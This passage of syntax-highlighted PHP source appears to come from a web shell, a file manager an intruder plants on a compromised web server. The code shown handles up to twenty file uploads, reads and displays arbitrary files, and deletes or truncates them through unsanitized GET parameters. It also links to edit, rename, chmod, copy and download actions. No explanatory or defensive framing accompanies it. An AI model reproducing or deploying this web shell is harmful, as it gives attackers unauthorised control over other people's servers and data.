<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile4</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text5&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile5</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile5</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text6&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile6</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile6</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text7&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile7</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile7</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text8&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile8</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile8</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text9&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile9</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile9</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text10&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile10</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile10</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text11&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile11</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile11</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text12&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile12</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile12</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text13&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile13</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile13</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text14&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile14</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile14</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text15&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile15</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile15</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text16&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile16</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile16</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text17&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile17</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile17</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text18&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile18</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile18</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text19&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile19</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile19</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text20&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile20</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile20</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;}</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;yes&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;yes&quot;</span><span class="p">){</span>
<span class="nv">$d</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span> <span class="nv">$e</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">);</span>
<span class="nv">$delresult</span><span class="o">=</span><span class="s2">&quot;Success </span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2"> deleted &amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">2;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}</span>
<span class="s2">if(@</span><span class="si">$_GET[&#39;clean&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="s2">@</span><span class="si">$e</span><span class="s2">=</span><span class="si">$_GET[&#39;e&#39;]</span><span class="s2">;</span>
<span class="si">$x</span><span class="s2">=fopen(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$e</span><span class="s2">&quot;,&quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="s2">fwrite(</span><span class="si">$x</span><span class="s2">,&quot;&quot;);</span>
<span class="s2">echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=&quot;</span><span class="o">.@</span><span class="nv">$e</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">]){</span>
<span class="nv">$d</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span>
<span class="nv">$e</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="nv">$pinf</span><span class="o">=</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$e</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="o">.@</span><span class="nv">$pinf</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">],</span><span class="nv">$images</span><span class="p">)){</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;img=1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;}</span>
<span class="nv">$filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$fd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fread</span> <span class="p">(</span><span class="nv">$fd</span><span class="p">,</span> <span class="o">@</span><span class="nb">filesize</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
<span class="nv">$c</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="nv">$de</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">;</span>
<span class="nv">$de</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$de</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$de</span><span class="p">)){</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$de</span><span class="p">)){</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;READ ONLY&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}}</span>
<span class="k">echo</span> <span class="s2">&quot;[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Delete&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ef=</span><span class="si">$e</span><span class="s2">&amp;edit=1&#39;&amp;gt;Edit&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;clean=1&#39;&amp;gt;Filesize to 0 byte&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;replace=1&#39;&amp;gt;Replace text in file&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;download=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Download&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;rename=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Rename&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;chmod=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;CHMOD&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ccopy_to=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Copy&amp;lt;/a&amp;gt;]&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">File contents:&amp;lt;br&amp;gt;</span>
<span class="si">$de</span><span class="s2"></span>
<span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;table width=100% border=1 cellpadding=0 cellspacing=0&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;pre&amp;gt;</span>
<span class="si">$c</span><span class="s2"></span>

<span class="s2">&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;/table&amp;gt;</span>

<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span>
<span class="nv">$delete</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">DELETE: Are you sure?&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;delete=&quot;</span><span class="o">.@</span><span class="nv">$delete</span><span class="o">.</span><span class="s2">&quot;&amp;yes=yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Yes&amp;lt;/a&amp;gt; || &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?no=1&#39;&amp;gt;No&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;yes&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;yes&quot;</span><span class="p">){</span>
<span class="o">@</span><span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span> <span class="o">@</span><span class="nv">$e</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="nv">$delresult</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;no&#39;</span><span class="p">]){</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s2">&quot;;</span>
<span class="s2">}</span>


<span class="s2">} #end of delete</span>
<span class="s2">echo </span><span class="si">$copyr</span><span class="s2">;</span>
<span class="s2">exit;</span>
<span class="s2">} #end of e</span>

<span class="s2">if(@</span><span class="si">$_GET[&#39;edit&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="s2">@</span><span class="si">$d</span><span class="s2">=</span><span class="si">$_GET[&#39;d&#39;]</span><span class="s2">;</span>
<span class="s2">@</span><span class="si">$ef</span><span class="s2">=</span><span class="si">$_GET[&#39;ef&#39;]</span><span class="s2">;</span>
<span class="si">$e</span><span class="s2">=</span><span class="si">$ef</span><span class="s2">;</span>
<span class="s2">if(is_file(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$ef</span><span class="s2">)){</span>
<span class="s2">if(!is_writable(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$ef</span><span class="s2">)){echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">READ</span> <span class="nx">ONLY</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}}</span>
<span class="s2">echo &quot;</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;del_f=1&amp;wich_f=$e&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Delete</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;ef=$e&amp;edit=1&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Edit</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;e=$e&amp;clean=1&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Filesize</span> <span class="nx">to</span> <span class="mi">0</span> <span class="nx">byte</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;e=$e&amp;replace=1&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Replace</span> <span class="nx">text</span> <span class="nx">in</span> <span class="nb">file</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;download=$e&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Download</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span 